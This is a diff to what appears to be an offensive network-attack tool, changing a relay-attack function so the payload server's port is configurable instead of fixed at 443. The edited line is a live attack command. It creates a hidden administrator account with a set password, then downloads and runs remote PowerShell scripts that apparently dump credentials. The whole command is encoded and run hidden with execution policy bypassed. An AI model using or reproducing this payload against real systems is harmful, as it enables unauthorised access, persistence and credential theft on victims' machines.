@@ -975,7 +975,7 @@ def run_relay_attack(iface, args):
         remote_cmd = run_empire_deathstar(iface, args)
     else:
         local_ip = get_local_ip(iface)
-        text_cmd = "net user /add icebreaker P@ssword123456; net localgroup administrators icebreaker /add; IEX (New-Object Net.WebClient).DownloadString('http://{}:443/Invoke-Cats.ps1'); Invoke-Cats -pwds; IEX (New-Object Net.WebClient).DownloadString('http://{}:443/Invoke-Pwds.ps1'); Invoke-Pwds".format(local_ip, local_ip)
+        text_cmd = "net user /add icebreaker P@ssword123456; net localgroup administrators icebreaker /add; IEX (New-Object Net.WebClient).DownloadString('http://{}:{}/Invoke-Cats.ps1'); Invoke-Cats -pwds; IEX (New-Object Net.WebClient).DownloadString('http://{}:{}/Invoke-Pwds.ps1'); Invoke-Pwds".format(local_ip, str(args.port), local_ip, str(args.port))
         enc_cmd = encode_for_ps(text_cmd)
         remote_cmd = 'powershell -nop -exec bypass -w hidden -enc {}'.format(enc_cmd)
 
